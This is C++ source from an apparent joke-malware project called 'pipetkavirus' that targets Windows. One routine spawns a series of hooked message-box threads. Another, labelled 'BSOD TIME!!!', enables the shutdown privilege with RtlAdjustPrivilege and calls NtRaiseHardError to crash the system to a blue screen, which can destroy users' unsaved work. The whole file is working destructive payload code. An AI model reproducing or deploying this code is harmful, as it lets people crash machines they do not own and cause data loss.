#include <Windows.h>
#include <activation.h>
#include "pipetkavirus.h"
#include "pipetka_data.h"
#include "pipetka_payloads.h"
int scrw, scrh;
using namespace std;

DWORD WINAPI ripMessageThread(LPVOID parameter) 
{
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	UnhookWindowsHookEx(hook);

	return 0;
}
void killWindows() {
	//Cool MessageBOXES
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(500);
	}

	void killWindowsInstant();
}

void killWindowsInstant() {
	// BSOD TIME!!!
		HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
}
